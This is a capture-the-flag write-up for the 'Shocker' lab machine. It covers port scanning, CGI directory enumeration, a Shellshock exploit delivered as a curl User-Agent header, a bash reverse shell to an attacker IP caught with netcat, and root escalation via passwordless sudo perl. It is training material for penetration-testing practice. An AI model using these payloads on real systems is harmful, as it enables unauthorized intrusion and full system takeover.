# Rust scan result

```bash
ghost@localhost [23:05:21] [~/Documents/tj-null-boxes/shocker] [master]
-> % rustscan -a 10.10.10.56 -- -sC -sV
Open 10.10.10.56:80
Open 10.10.10.56:2222

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<br/>

# Port 80 (Apache)

```
ghost@localhost [15:40:20] [~/Documents/tj-null-boxes/shocker] [master]
-> % curl -i http://10.10.10.56
HTTP/1.1 200 OK
Date: Sun, 21 Aug 2022 07:40:38 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Fri, 22 Sep 2017 20:01:19 GMT
ETag: "89-559ccac257884"
Accept-Ranges: bytes
Content-Length: 137
Vary: Accept-Encoding
Content-Type: text/html

 <!DOCTYPE html>
<html>
<body>

<h2>Don't Bug Me!</h2>
<img src="bug.jpg" alt="bug" style="width:450px;height:350px;">

</body>
</html>
```

### Gobuster

```bash
ghost@localhost [15:58:42] [~/Documents/tj-null-boxes/shocker] [master *]
-> % gobuster dir -u http://10.10.10.56 -k -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/21 15:59:16 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 290]
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/cgi-bin/             (Status: 403) [Size: 294]
/index.html           (Status: 200) [Size: 137]
/server-status        (Status: 403) [Size: 299]

===============================================================
2022/08/21 16:02:14 Finished
===============================================================
```

```bash
ghost@localhost [16:08:37] [~/Documents/tj-null-boxes/shocker] [master *]
-> % gobuster dir -u http://10.10.10.56/cgi-bin/ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x sh
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh
[+] Timeout:                 10s
===============================================================
2022/08/21 16:08:41 Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 119]
...
```

### user.sh

CGI bin seems to be running the script and returning the output in response. We can try shellshock vulnerability to see if it can be exploited.

```bash
ghost@localhost [16:11:50] [~/Documents/tj-null-boxes/shocker] [master]
-> % curl -i http://10.10.10.56/cgi-bin/user.sh
HTTP/1.1 200 OK
Date: Sun, 21 Aug 2022 08:12:47 GMT
Server: Apache/2.4.18 (Ubuntu)
Transfer-Encoding: chunked
Content-Type: text/x-sh

Content-Type: text/plain

Just an uptime test script

 04:12:47 up 24 min,  0 users,  load average: 0.00, 0.00, 0.00
```

<br/>

# Shellshock exploitation

```bash
ghost@localhost [16:16:01] [~/Documents/tj-null-boxes/shocker] [master]
-> % curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.7/443 0>&1" http://10.10.10.56/cgi-bin/user.sh

...

ghost@localhost [16:09:31] [~/Documents/tj-null-boxes/shocker] [master *]
-> % nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.56] 57042
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

<br/>

# Privilege escalation

```bash
...
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

So we can run `perl` as root user without password.

```bash
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/bash";'
uid=0(root) gid=0(root) groups=0(root)
```

<br/>

# Flags

```bash
shelly@Shocker:/home/shelly$ cat user.txt
2ec2****
```

```bash
cd /root

ls
root.txt

cat root.txt
52c2****
```
